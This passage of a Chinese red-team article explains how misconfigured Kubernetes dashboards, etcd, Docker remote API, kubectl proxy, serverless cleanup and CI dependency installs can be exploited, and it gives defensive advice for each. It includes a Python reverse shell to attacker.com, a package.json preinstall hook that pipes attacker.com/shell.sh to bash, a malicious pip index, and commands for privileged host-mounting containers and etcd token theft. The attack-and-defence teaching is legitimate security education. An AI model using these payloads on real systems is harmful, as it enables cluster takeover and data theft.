然而通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。

我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。

但有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。

这个极具安全风险的设置，具体如下：

1. 新建 dashboard-admin.yaml 内容如下（该配置也类似于 "利用大权限的 Service Account" 一小节的配置 ）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: kubernetes-dashboard-admin
subjects:
- kind: ServiceAccount
  name: kubernetes-dashboard
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfticH5NXjL1A5BAceJmkqQHSHL0NcKWevHlFricISGwLaIQiayeuU0RebIQ/640?wx_fmt=png)

2. 执行 kubectl create -f dashboard-admin.yaml

此时用户通过点击 Skip 进入 dashboard 即可拥有管理集群的权限了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftYmIEUwGXaNtDvxLrYmbMgYp470KFrZEugWXdTdBeVY2dLKVHRFayOQ/640?wx_fmt=png)

进入到 dashboard 我们可以管理 Pods、CronJobs 等，这里介绍下我们如何通过创建 Pod 控制 node 节点。

我们新建一个以下配置的 Pod，该 pod 主要是将宿主机根目录挂载到容器 tmp 目录下。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep 10000"]
    volumeMounts:
    - name: host-root
      mountPath: /tmp
  volumes:
  - name: host-root
    hostPath:
      path: /
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftXETcKPkAS5r8rm1ZoyACLWGx74PftXkJSs0zBA0unAYMPT9E7bgWBQ/640?wx_fmt=png)

之后我们便可以通过该容器的 tmp 目录管理 node 节点的文件。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwota0l4oVnG2gI2D4mS6TlQaaljFHgTcwZ84ujRBibh5OdP5Jz4fzkA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftOne3a77LTdFNhia8tudS6uo4eXP8wwL83KLGK41ibx4h04fOandVQ0bg/640?wx_fmt=png)

值得注意的是，为了集群的稳定性和安全性要求，在 Kubernetes 默认设计的情况下 Pod 是不能调度到 master 节点的，但如果用户自行设置关闭了 Master Only 状态，那么我们可以直接在 master 节点新建 Pod 更直接的控制 master node；不过目前各大主流云产商上的 Kubernetes 集群服务，都会默认推荐让 Master 节点由云厂商托管，更加加剧了 Master 节点渗透和控制的难度 。

**防御建议**：
- 禁用enable-skip-login选项
- 避免将cluster-admin角色绑定到dashboard服务账号
- 实施网络策略，限制对dashboard的访问
- 使用身份认证代理或OAuth提供商进行认证
- 考虑使用其他更安全的管理工具，如kubectl或专用管理平台

### 7.5. etcd

etcd 被广泛用于存储分布式系统或机器集群数据，其默认监听了 2379 等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露，本文我们主要讨论 Kubernetes 由于配置错误导致 etcd 未授权访问的情况。Kubernetes 默认使用了 etcd v3 来存储数据，如果我们能够控制 Kubernetes etcd 服务，也就拥有了整个集群的控制权。

在 Kubernetes 中用户可以通过配置 /etc/kubernetes/manifests/etcd.yaml 更改 etcd pod 相关的配置，倘若管理员通过修改配置将 etcd 监听的 host 修改为 0.0.0.0，则通过 ectd 获取 Kubernetes 的认证鉴权 token 用于控制集群就是自然而然的思路了，方式如下：

首先读取用于访问 apiserver 的 token

```bash
# 查找可用的token
etcdctl --endpoints=https://your-etcd-endpoint:2379 --cacert=/path/to/ca.crt --cert=/path/to/cert.crt --key=/path/to/key.key get / --prefix --keys-only | grep /secrets/

# 读取特定token
etcdctl --endpoints=https://your-etcd-endpoint:2379 --cacert=/path/to/ca.crt --cert=/path/to/cert.crt --key=/path/to/key.key get /registry/secrets/kube-system/default-token-abcde
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft9L0VJiaVHwkv7NYMms1GE6x8atYPbJGn3GjMLP8GyoVuialJY8boeg1g/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftSKBkEC7icKASMRq3ccycnKCSaWyEAoK3ib2Q2WDHXDpgGZGcSoicv6wuQ/640?wx_fmt=png)

利用 token 我们可以通过 apiserver 端口 6443 控制集群：

```bash
# 使用获取的token访问API服务器
curl -k -H "Authorization: Bearer <token>" https://kubernetes-api-server:6443/api/v1/namespaces
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftLhA7tToh4wYcXDpeico3iaTgcaiaQdiaiajQF2jw0aXc6iaDrGdEb0ibB1epA/640?wx_fmt=png)

**防御建议**：
- 避免将etcd暴露到公网
- 使用TLS双向认证保护etcd通信
- 实施网络策略，限制对etcd的访问
- 定期备份etcd数据
- 考虑使用加密功能保护敏感数据

### 7.6. docker remote api

Docker Engine API 是 Docker 提供的基于 HTTP 协议的用于 Docker 客户端与 Docker 守护进程交互的 API，Docker daemon 接收来自 Docker Engine API 的请求并处理，Docker daemon 默认监听 2375 端口且未鉴权，我们可以利用 API 来完成 Docker 客户端能做的所有事情。

Docker daemon 支持三种不同类型的 socket: unix, tcp, fd。默认情况下，Docker daemon 监听在 unix:///var/run/docker.sock，开发者可以通过多种方式打开 tcp socket，比如修改 Docker 配置文件如 / usr/lib/systemd/system/docker.service：

```
[Service]
ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft5rRHUuRvfdbtVIQT9KvN9jN6fuMMR6DEqkOmQq5Qk7eZjTDAYBFQ7g/640?wx_fmt=png)

之后依次执行 systemctl daemon-reload、systemctl restart docker 便可以使用 docker -H tcp://[HOST]:2375 这种方式控制目标 docker

```bash
# 列出所有容器
docker -H tcp://target-host:2375 ps -a

# 创建特权容器
docker -H tcp://target-host:2375 run -d --privileged -v /:/host_root alpine:latest sh -c "while true; do sleep 1; done"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftFYmmUrU7CwrIjs8FWGmjVppvdeq1LsdgFuUDQKsWHUX5zic4rgEwDdQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftMyam51E9TJW5XdHt0BR9pfGsRhuITsxFcSqFuR5vjgJDqq31naglFw/640?wx_fmt=png)

因此当你有访问到目标 Docker API 的网络能力或主机能力的时候，你就拥有了控制当前服务器的能力。我们可以利用 Docker API 在远程主机上创建一个特权容器，并且挂载主机根目录到容器，对主机进行进一步的渗透，更多利用方法参考容器逃逸章节。

检测目标是否存在 docker api 未授权访问漏洞的方式也很简单，访问 http://[host]:[port]/info 路径是否含有 ContainersRunning、DockerRootDir 等关键字。

**防御建议**：
- 避免将Docker API暴露到公网
- 使用TLS双向认证保护Docker API通信
- 实施网络策略，限制对Docker API的访问
- 考虑使用授权插件限制API访问权限
- 监控Docker API调用，检测异常行为

### 7.7. kubectl proxy

kubectl proxy 这个子命令大家可能遇到比较少，这里单独介绍一下；由于上述几个组件的安全问题较为常见和出名，且在目前开源分支里它们在鉴权这个方面都是默认安全的，所以直接出现问题的可能性较小，企业在内外网也都收敛得不错；此时 kubectl proxy 这个子命令反而是另一个常见且蠕虫利用起来非常简单粗暴的问题。

了解使用过 Kubernetes 的同学应该知道，如果你在集群的 POD 上开放一个端口并用 ClusterIP Service 绑定创建一个内部服务，如果没有开放 NodePort 或 LoadBalancer 等 Service 的话，你是无法在集群外网访问这个服务的（除非修改了 CNI 插件等）。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTo2SWAYNZmQYibibfOa1ur0j4rV4vfytPaVS9yx1C03Sc4xPulcibyG5A/640?wx_fmt=png)

如果想临时在本地和外网调试的话，kubectl proxy 似乎是个不错的选择。

```bash
# 不安全的用法
kubectl proxy --address=0.0.0.0 --port=8001 --accept-hosts=.*

# 更安全的替代方案
kubectl proxy --address=127.0.0.1 --port=8001
# 然后使用SSH隧道或其他安全方式访问
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftMCKwyeAcnN0P2vs5POWIRoAzSCsicLWRiaFaWhOOFI3YkZdCVFwltISA/640?wx_fmt=png)

但其实 kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 --address=0.0.0.0 就是极其危险的了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft3OEqmTq1QzrDCBqE9UibQn3hiboicicYHCaMbn3dAjDdJxrt4QHibAqZV9w/640?wx_fmt=png)

所以这里的利用和危害和 APIServer 的小节是相似的。

**防御建议**：
- 避免使用--address=0.0.0.0参数
- 使用--accept-hosts参数限制访问来源
- 考虑使用API网关或反向代理代替直接暴露kubectl proxy
- 实施网络策略，限制对proxy端口的访问
- 仅在必要时临时启用kubectl proxy，使用完毕后立即关闭

## 8. 容器镜像安全问题

容器镜像的安全扫描能力是很多乙方商业产品和甲方安全系统首先会推进的容器安全建设方向。不像容器运行时安全监控需要较高的成本、稳定性要求和技术积累，也有业界相对成熟的开源方案。

容器镜像是容器安全非常关键且重要的一环，当获取到节点权限或管理员 PC 权限时，~/.docker/config.json 文件内就可能存有镜像仓库账号和密码信息，用户名和密码只用 Base64 编码了一下，对于安全人员来说和没有是一样的。

```json
{
  "auths": {
    "https://index.docker.io/v1/": {
      "auth": "dXNlcm5hbWU6cGFzc3dvcmQ="  // 这是Base64编码的username:password
    }
  }
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftblRJtmc8ibDkyGhiay04AvRp9kpUbP0urpobAKnXXbcAhGqfDq0YKH0g/640?wx_fmt=png)

很多 POD 和线上容器在使用镜像时，可能用 latest 或默认没有指定版本，所以劫持镜像源之后只要在原本的 latest 之上植入恶意代码并 push 新的版本镜像，就可以在获取镜像权限之后进而获取线上的容器权限。

不仅在安全攻防领域，作为一个长期依赖容器技术的半吊子开发者，我也不建议用 latest 镜像标签作为线上环境的长期方案；从研发运维角度的最佳实践来看，使用特定版本的 TAG 且可以和代码版本控制相对应是比较推荐的方案，应该保障每个镜像都是可追踪溯源的。

比较有趣的是，我们曾经遇到企业在基础容器镜像里打入 sshd 并且在 init.sh 主程序中启动 sshd 程序（无论是安全还是容器架构最佳实践都是不建议的），导致所有 Kubernetes 集群里的容器都会开放 22 端口并且拥有一样的 / etc/shadow 文件和 / root/.ssh/authorized_keys。这就代表所有的容器都可以使用一个通用密码和 ssh 证书去登录。因此在逃逸获取容器的宿主机权限后，分析容器基础镜像的通用安全问题确实可以很快扩大影响面。

**容器镜像安全最佳实践**：

1. **使用特定版本标签**
   - 避免使用`latest`标签
   - 使用语义化版本(如v1.2.3)或与代码版本关联的标签
   - 实施不可变镜像策略，一旦构建不再修改

2. **镜像签名和验证**
   - 使用工具如Cosign或Notary对镜像进行签名
   - 在部署前验证镜像签名
   - 示例：
     ```bash
     # 使用Cosign签名镜像
     cosign sign --key cosign.key my-registry.io/my-image:v1.0.0
     
     # 验证镜像签名
     cosign verify --key cosign.pub my-registry.io/my-image:v1.0.0
     ```

3. **镜像扫描**
   - 使用工具如Trivy、Clair或Anchore扫描镜像中的漏洞
   - 在CI/CD流程中集成镜像扫描
   - 示例：
     ```bash
     # 使用Trivy扫描镜像
     trivy image my-registry.io/my-image:v1.0.0
     ```

4. **最小化镜像**
   - 使用多阶段构建减小镜像大小
   - 选择最小化基础镜像(如Alpine、distroless)
   - 仅安装必要的包和依赖

5. **镜像准入控制**
   - 使用准入控制器如OPA Gatekeeper验证镜像来源
   - 限制使用未经授权的镜像仓库
   - 示例Gatekeeper策略：
     ```yaml
     apiVersion: constraints.gatekeeper.sh/v1beta1
     kind: K8sTrustedImages
     metadata:
       name: trusted-images
     spec:
       match:
         kinds:
         - apiGroups: [""]
           kinds: ["Pod"]
       parameters:
         repositories:
         - "my-registry.io/"
     ```

6. **安全的镜像构建流程**
   - 使用安全的基础镜像
   - 定期更新基础镜像
   - 避免在镜像中包含敏感信息(如密钥、证书)

7. **镜像仓库安全**
   - 使用强密码或证书认证
   - 实施仓库访问控制
   - 定期轮换访问凭证
   - 加密传输和存储

## 9. 二次开发所产生的安全问题

### 9.1. 对 Kubernetes API 的请求转发或拼接

熟悉 Kubernetes 架构的同学可能知道，管理员管理 Kubernetes 无论是使用 kubectl 或 Kubernetes dashboard 的 UI 功能，其实都是间接在和 APIServer 做交互。

参考官方的架构图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftE9uEUhww0LFR8Tbs7YDicEddrKdZnGEVVqa495YOsUzGODrvj29sVsg/640?wx_fmt=png)

那么如果需求需要在 Kubernetes 原本的能力上做开发的话，很有可能产品后端就是请求了 APIServer 的 Rest API 实现的。

攻击者破坏程序原本想对 APIServer 所表达的语义，注入或修改 Rest API 请求里所要表达的信息，就可以达到意想不到的效果。

例如下面的代码，用户传入 namespace、pod 和容器名即可获取相应容器的日志：

```python
@app.route('/api/logs')
def get_logs():
    namespace = request.args.get('namespace')
    pod = request.args.get('pod')
    container = request.args.get('container')
    
    # 不安全的实现 - 直接拼接参数
    url = f"https://apiserver:8443/api/v1/namespaces/{namespace}/pods/{pod}/log?container={container}"
    
    # 安全的实现 - 参数验证和规范化
    if not re.match(r'^[a-z0-9]([-a-z0-9]*[a-z0-9])?$', namespace):
        return jsonify({"error": "Invalid namespace format"}), 400
    if not re.match(r'^[a-z0-9]([-a-z0-9]*[a-z0-9])?$', pod):
        return jsonify({"error": "Invalid pod name format"}), 400
    if not re.match(r'^[a-z0-9]([-a-z0-9]*[a-z0-9])?$', container):
        return jsonify({"error": "Invalid container name format"}), 400
    
    response = requests.get(url, headers={"Authorization": f"Bearer {token}"})
    return response.text
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftljXMiblpicwPTFm2fiaicCwpxO9s7kz24VWeubW8INcGcu7fHOVjibu2n0Q/640?wx_fmt=png)

相似的需求和 API 还有例如：

1. 到用户自己的容器内创建一个 web console 供用户进行远程调试
```
POST https:/apiserver:8443/api/v1/namespaces/default/pods/nginx/exec?command=bash&container=nginx&stdin=true&stdout=true&tty=true
```

2. 给用户销毁自己 POD 的能力
```
DELETE https://apiserver:8443/api/v1/namespaces/default/pods/sleep-75c6fd99c-g5kss
```

这类型的需求在多租户的集群设计里比较常见。渗透测试选手看到这样的代码或 API，首先想到的就是越权，把 namespace、pod 和容器名修改为他人的，就可以让二次开发的代码去删除其他用户的 POD、进入其他用户的容器里执行命令、获取其它 POD 的日志等。  

除了上述的功能点，这里比较容易出问题且影响较大的功能和业务逻辑是多租户集群平台的自研 Web Console 功能，Web Console 的越权问题可以直接导致任意容器登录和远程控制，也是非常值得关注的一个点。

其实我们甚至可以修改获取日志、删除 POD、执行命令的 Rest API 语义：

例如在上述 namespace 命名空间处插入 "default/configmaps/istio-ca-root-cert?ingore="，

原本请求的

"https://apiserver:6443/api/v1/namespaces/istio-dev/pods/service-account-simple/lo g?container=test-container" 

就会转变为

"https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert?ingore=/pods/service-account-simple/lo g?container=test-container"，

实际就是请求了

https://apiserver:6443/api/v1/namespaces/default/configmaps/istio-ca-root-cert，从获取日志转变了为获取 configmap。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftO66YjDQMVGFz5zhTJLiaNA9ySASneO662ARGOsDp7sm4rYkib4E1MyAQ/640?wx_fmt=png)

**防御建议**：
- 实施严格的输入验证，使用白名单过滤用户输入
- 使用参数化查询而非字符串拼接
- 实施最小权限原则，限制API访问权限
- 使用Kubernetes RBAC限制服务账号权限
- 监控API调用，检测异常行为
- 实施路径规范化，防止路径遍历攻击

## 10. Serverless

Serverless 还有一个比较大漏洞挖掘的方向是资源占用，例如驻留进程，驻留文件，进程偷跑，句柄耗尽等条件竞争漏洞，用于影响多租户集群，占用计算资源等。我们之前也研究过相关的安全漏洞和利用方法，但因为和传统的黑客攻防对抗相关性较少，此处暂且不表。

这里只描述那些确实成为安全演习关键路径一环的漏洞。

## 10.1. 文件驻留导致命令执行

有些 Serverless 实现在应用程序生命周期结束之后，程序文件的清理上进入了僵局。一方面开发者希望借助容器 "对 Linux Cgroup 和 Namespace 进行管理的特性" 用于实现限制应用的资源访问能力和进程权限的需求；在此之上，开发者希望能更快的达到用户文件清理的目的，避免反复初始化容器环境带来的时间和资源上的消耗，复用同一个容器环境。

而在蓝军的视角里，这样的处理方式会导致多个用户的应用会存在多个用户在不同时间段使用一个容器环境的情况，在安全性上是比较难得到保障的。

以面向 Python 开发者的 Serverless 架构为例，开发者所构想的简化模型是这样的：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftrDqh6Mv2jkjXAsnotwCywtqGaNCDdHt7PavrjRInTzUVOY9eUwhdUg/640?wx_fmt=png)

用户文件清理的代码实现上，简化可参考：

```python
def cleanup_user_files(user_dir):
    """清理用户文件目录"""
    try:
        # 不安全的实现 - 使用shell命令并且没有处理特殊字符
        os.system(f"rm -rf {user_dir}/*")
        
        # 安全的替代方案
        for root, dirs, files in os.walk(user_dir, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
                
        return True
    except Exception as e:
        logging.error(f"Failed to cleanup user directory: {e}")
        return False
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftypEhfurOuOClWQrtN3z8IhAL84xibuB2W8ERiaVN8uk2euZViaGvvH2ew/640?wx_fmt=png)

在进行包括上述文件删除动作在内的一系列环境清理工作之后，容器内外的主调度进程会写入其他租户的代码到当前容器内，此时这个容器就进入了下一个应用的 Serverless 生命周期。

虽然，主框架代码实现内有很多类似调用系统命令拼接目录等参数进行执行的代码实现，但是类似命令注入的问题大多只能影响到当前的生命周期；而又因为用户权限的问题，我们没办法修改其他目录下的文件。

于是我们构建了这样一个目录和文件：

```
/app/user_code/
├── --help
└── requests.py
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftuEbNuIjDbKaMYLBwvlAVozHU0ZcicdsnOor5ZND4Hgy3vRn6CXskQFg/640?wx_fmt=png)

当程序执行 rm -rf * 时，因为 bash glob 对 * 号的返回是有默认排序的，这里可参考下方 bash 的文档，只要我们不去修改 LC_ALL 的环境变量，我们构造的 --help 文件会排列在文件列表的最前方，导致 rm 会执行 rm --help 而终止，恶意文件得以保留。

_Pathname Expansion_

_After word splitting, unless the -f option has been set, bash scans each word for the characters *, ?, and [. If one of these characters appears, then the word is regarded as a pattern, and replaced with an alphabetically sorted list of file names matching the pattern._

我们可以简单在 bash 内进行验证，可以看到 rm -rf * 命令被 --help 强行终止，我们所植入的恶意文件还依然存在没有被清理掉，同时 rm --help 的命令执行返回为 0，不会产生 OS ERROE Code，清理进程会认为这里的清除命令已经成功执行：

```bash
$ mkdir test && cd test
$ touch --help malicious.py
$ ls
--help  malicious.py
$ rm -rf *
BusyBox v1.31.1 (2020-04-01 18:15:20 UTC) multi-call binary.

Usage: rm [-ifrv] FILE...

Remove (unlink) FILEs

        -i      Always prompt before removing
        -f      Never prompt
        -r,-R   Recurse
        -v      Verbose
$ ls
--help  malicious.py
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftpjnbtv45r37Ov4icyG36okaRFb5uywHMRbPPmRAiaP1cuk33ORSwhicLg/640?wx_fmt=png)

而实际在 serverless log 里的返回，可参考：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftD7gxhR3T4yGxysBJPlceL9wS1Cfvw7kVEgFibFrLqkMGaHfIrcyAOCw/640?wx_fmt=png)

此时，serverless 的主调度程序会以为自己已经正常清理了容器环境，并写入另外一个租户的源码包进行执行，而当另外一个租户的代码执行至 import requests 时，我们驻留在应用目录下的 requests.py 内的恶意代码就会被执行。

```python
# 恶意requests.py文件内容
import os
import socket
import subprocess

# 反弹shell代码
def reverse_shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("attacker.com",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

# 当被导入时执行
reverse_shell()

# 伪装成正常requests模块
class Session:
    def __init__(self):
        pass
    def get(self, url):
        pass
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTLwvYdm6tuj1pzCs8k7x3S2aPQ6cYRkUbvs2TADAYX7pQUVJMD4tiag/640?wx_fmt=png)

不过值得注意的是，因为 serverless 的生命周期一般极为有限，所以此时获取的 shell 可能会在短时间结束，触发新一轮的反弹 shell，且 Servless 容器环境内的信息相对单一和简便。所以容器环境里值得我们探索和翻找的地方也不多，一般需要关注：

1.  新的代码
    
2.  代码内部配置
    
3.  环境变量
    
4.  秘钥、证书、密码信息等
    

不同的 serverless 架构实现对于存储和传递相应信息的方式各有不同。

**防御建议**：
- 使用安全的文件清理方法，避免使用shell命令
- 在不同shell环境(sh、bash、zsh等)中测试文件清理逻辑
- 为每个用户请求使用全新的容器环境
- 实施沙箱隔离，限制用户代码的权限
- 监控异常文件操作和进程行为

## 10.2. 攻击公用容器 / 镜像

现在我们知道了，很多 Serverless 的用户代码都跑在一个个容器内。不同应用的代码运行于不同的容器之上，依靠容器原本的能力进行资源回收和隔离。由于 Serverless 应用的代码会进行相应的结构化解耦，且每个应用容器的底层环境相对来说是一致的。所以其实，根据应用漏洞获取更多应用类 Serverless 容器不仅困难而且在内网渗透中作用相对较为有限，能做的事情也相对较少。

但其实在不同的 Serverless 架构中，都有多类持久化且公用的容器以实现程序调度、代码预编译、代码下载运行等逻辑。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqufjNJKdpiaBRywruibXuUElXU2rDiaicQnIAPcruJ2SLJpPmVOicMQOFWA/640?wx_fmt=png)

这类容器一般拥有获取所有用户代码、配置和环境变量的能力，同时也比较容易出现 Docker IN Docker 或大权限 Service Account 的设计。

如何控制这类型的容器呢？以下是我们在攻防过程中遇到的场景：

1. 在下载源代码时，使用 git clone 进行命令拼接，导致存在命令注入；

```bash
# 不安全的实现
git clone $REPO_URL

# 安全的替代方案
if [[ $REPO_URL =~ ^https://github.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+$ ]]; then
  git clone "$REPO_URL"
else
  echo "Invalid repository URL"
  exit 1
fi
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftWvSD1Tu67qCpVSOavKtibTv8WYEiaKaRbVPOlh1FHPrWLqktY5eRUj2Q/640?wx_fmt=png)

2. 在安装 node.js 依赖包时，构造特殊的 package.json 利用 preinstall 控制公用容器。

```json
{
  "name": "malicious-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -s http://attacker.com/shell.sh | bash"
  },
  "dependencies": {
    "express": "^4.17.1"
  }
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftSBprNNstw3ok5GDpMaQbvjmoW0IRy05SzlY72qwKOtblrRVqUrx6Pg/640?wx_fmt=png)

3. 配置指向恶意第三方仓库的 pip requirements.txt，利用恶意 pip 包获取依赖打包容器的权限，同类的利用手法还可以作用于 nodejs、ruby 等语言的包管理器。

```
# requirements.txt
flask==2.0.1
requests==2.26.0
malicious-package==1.0.0 --index-url https://pypi.attacker.com/simple/
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft6kHyR00oTMD2dW0589S9ib2XpiaTUrhLw4ryWKL065aODR2u4FQVhG1Q/640?wx_fmt=png)

4. 因为容器镜像里的打了低版本 git、go 等程序，在执行 git clone,  git submodule update(CVE-2019-19604), go get 时所导致的命令执行，

下图为 CVE-2018-6574 的 POC 可参考： https://github.com/neargle/CVE-2018-6574-POC/blob/master/main.go。

```go
package main

import "C"
import "fmt"

// #cgo CFLAGS: -fplugin=./plugin.so
// typedef int (*intFunc) ();
//
// int
// bridge_int_func(intFunc f)
// {
//      return f();
// }
//
// int fortytwo()
// {
//      return 42;
// }
import "C"

func main() {
    f := C.intFunc(C.fortytwo)
    fmt.Println(int(C.bridge_int_func(f)))
    // Output: 42
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft6DuCaxYUibWhNTmguQic2JNtwZLTibhFjtgRGecfANIlCKoLITr8ap3rQ/640?wx_fmt=png)

**防御建议**：
- 使用安全的代码下载和依赖安装方法
- 验证所有外部输入，特别是仓库URL和依赖包
- 定期更新容器中的工具和库
- 使用可信的软件源和镜像仓库
- 实施最小权限原则，限制公用容器的权限
- 监控异常进程行为和网络连接

## 11. DevOps

我们从 2019 年开始研究 DevOps 安全攻防对抗的战场，不仅研究企业内部 DevOps 平台和产品的安全性，同时也不断在内部的研发流程中积极引入 DevOps 做蓝军武器化自动化研发的测试、发布、打包和编译等流程中。

**从蓝军的角度，在我们历史攻防对抗中比较值得注意的场景有以下几点：**

1. 目前不同的 DevOps 平台可能会包含不同的 Low-Code 流水线特性，隔离上也会大量采用我们上面提及的多租户容器集群设计，所以多租户集群下的渗透测试技巧也大致无二。

2. 控制了上述的多租户容器集群是可以控制集群所用节点服务器的，这些服务器的作用一般用于编译和构建业务代码，并接入代码管理站点如 Gitlab、Github 等，所以一般拥有获取企业程序各业务源码的权限。

3. DevOps 及其相关的平台其最重要的能力之一就是 CICD，因此控制 DevOps 也就间接拥有了从办公网、开发网突破进入生产网的方法；控制的应用数量和业务种类越多，也能根据应用的不同进入不同的隔离区。

另外在 DevOps 平台内若集成了日志组件（云原生的重点之一：可观察性）的话，那么日志组件和 Agent 的升级、安装问题一般会是重中之重，蓝军可以根据这个点达到获取公司内任意主机权限的目地。  

**DevOps安全最佳实践**：

1. **流水线安全**
   - 实施代码审查和变更管理
   - 使用签名验证确保代码完整性
   - 限制流水线权限，遵循最小权限原则
   - 监控异常的流水线行为

2. **凭证管理**
   - 使用安全的凭证存储(如Vault、Kubernetes Secrets)
   - 实施凭证轮换策略
   - 避免在代码或配置中硬编码凭证
   - 使用临时凭证而非长期凭证

3. **基础设施安全**
   - 隔离CI/CD环境
   - 实施网络分段，限制节点间通信
   - 定期更新和补丁CI/CD工具
   - 使用基础设施即代码(IaC)安全扫描工具

4. **构建环境安全**
   - 使用只读和临时构建环境
   - 在构建完成后销毁环境
   - 扫描构建依赖和产物中的漏洞
   - 实施构建环境的访问控制

5. **日志和监控**
   - 集中收集和分析CI/CD日志
   - 监控异常的构建行为
   - 实施告警机制，及时响应安全事件
   - 保留审计日志用于事后分析

## 12. 云原生 API 网关

作为 API 网关，它具有管理集群南北流量的功能，一般也可能作为集群流量的入口和出口（ingress/egress）。而作为标榜云原生特性的 API 网关产品，似乎无一例外都会具有动态配置、灵活修改、远程管理的特性，而这些特性往往以 REST API 对外提供服务。

然而在远程配置逻辑的鉴权能力上，身为网关这种基础网络的产品，各个受欢迎的开源组件在默认安全的实现上似乎还需努力。

以 Kong 为例，Kong API 网关 (https://github.com/Kong/kong) 是目前最受欢迎的云原生 API 网关之一，有开源版和企业版两个分支，被广泛应用于云原生、微服务、分布式、无服务云函数等场景的 API 接入中间件，为云原生应用提供鉴权，转发，负载均衡，监控等能力。

我们曾经在一次渗透测试中使用 Kong 的远程配置能力突破外网进入到内网环境中，可以参考之前的预警文章**《腾讯蓝军安全提醒：开源云原生 API 网关 Kong 可能会成为攻击方进入企业内网的新入口》**

Kong 使用 Kong Admin Rest API 作为管理 Kong Proxy 能力的关键入口，以支持最大程度的灵活性；在开源分支里，这个管理入口是没有鉴权能力的 (Kong 企业版支持对 Kong Admin Rest API 进行角色控制和鉴权)，Kong 建议用户在网络层进行访问控制；当攻击方可以访问到这个 API，他就具有了 Kong Proxy 的所有能力，可以查看和修改企业当前在南北流量管理上的配置，可以直接控制 API 网关使其成为一个开放性的流量代理 (比 SSRF 更便于使用和利用)；从攻击方的角度思考，控制了这个 API 等于是拥有了摸清网络架构和打破网络边界的能力。

当蓝军可以访问到 Kong Admin Rest API  和  Kong Proxy 时，蓝军可以通过以下步骤创建一个通往内网的代理：
